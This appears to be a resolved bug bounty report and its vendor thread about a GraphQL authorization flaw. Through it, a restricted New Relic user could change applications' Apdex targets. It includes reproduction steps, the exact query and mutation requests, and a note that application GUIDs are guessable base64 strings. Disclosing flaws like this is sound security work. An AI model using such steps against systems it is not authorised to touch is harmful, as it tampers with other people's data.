title: Restricted user can update Apdex target for applications by leveraging the GraphQL mutation
vulnerability_information_html:
Hey team,

I've found that Restricted user can update Apdex target for applications by leveraging the GraphQL mutation which doesn't properly implement authorization.

Steps to reproduce

1) Sign in NR with Restricted user
2) Navigate to https://api.newrelic.com/graphiql, intercept the request to nerd-graph.service.newrelic.com with Burp Suite.
3) Make sure there is at least 1 application created at your account
4) Change the Content-Type header value to application/graphql, change the body to the

query {
  actor {
    entitySearch(
      queryBuilder: {
        type: APPLICATION
      }
    ) {
      results {
        entities {
          name
          type
          guid
        }
      }
    }
  }
}

and send the request. The returned values are applications created at your account. Choose one of them and copy its guid.
4) Change the request body to the

mutation {
  apmApplicationEntityChangeSettings (
    guid: "MjM4NTkxNHxBUE18QVBQTElDQVRJT058MjMzNTcxMTk2"
    settings: {
      apdexTarget: 999
    }
  ) {
    entity {
      settings {
        apdexTarget
      }
      name
    }
  }
}

replacing the guid field value to your own one and send the request.
5) Make sure the response contains new apdexTarget (999). You can also navigate to this app in APM UI to make sure the UI also displays new apdexTarget for this app:

Impact

Restricted user can update Apdex target for applications

activities.message:
Hi @skavans,

Thank you for your report. We've sent this to the appropriate team and we'll let you know as soon as we have an update.

activities.message:
Hi @skavans,

We now believe this issue to be resolved. Can you confirm that you're no longer able to reproduce this issue?
activities.markdown_message:
Hi @skavans,

We now believe this issue to be resolved. Can you confirm that you're no longer able to reproduce this issue?

activities.message:
Hey @dmcmahon,

Unfortunately, the issue is still there.

Despite the GraphQL response is now empty like below:
{F714729}
, the app Apdex target still updates well:
{F714731}

P.S.: I've also found that the APM applications search GraphQL query doesn't return APM applications at all, but the GUID of the app can be easily guessed because it is actually the base64-encoded string like `2385914|APM|APPLICATION|233571196`.

activities.message:
Hi @skavans,

Thank you for checking into it. We've reached out to the team to dig in and see what else needs to be done.
activities.markdown_message:
Hi @skavans,

activities.message:
Hi @skavans,

It looks like this mutation is no longer available at all, so we should be all good here. Are you still able to modify the Apdex target?
activities.markdown_message:
Hi @skavans,

It looks like this mutation is no longer available at all, so we should be all good here. Are you still able to modify the Apdex target?

Hey @dmcmahon,

The mutation really seems to be removed now, so I think this issue is finally fixed:

{
  "errors": [
    {
      "locations": [
        {
          "column": 3,
          "line": 2
        }
      ],
      "message": "Cannot query field \"apmApplicationEntityChangeSettings\" on type \"RootMutationType\"."
    },
    {
      "locations": [
        {
          "column": 5,
          "line": 3
        }
      ],
      "message": "Unknown argument \"guid\" on field \"apmApplicationEntityChangeSettings\" of type \"RootMutationType\"."
    },
    {
      "locations": [
        {
          "column": 5,
          "line": 4
        }
      ],
      "message": "Unknown argument \"settings\" on field \"apmApplicationEntityChangeSettings\" of type \"RootMutationType\"."
    }
  ]
}

activities.message:
Hi @skavans,

Thank you for confirming the fix, and for catching the secondary issues there!

We'll mark this as Resolved now.
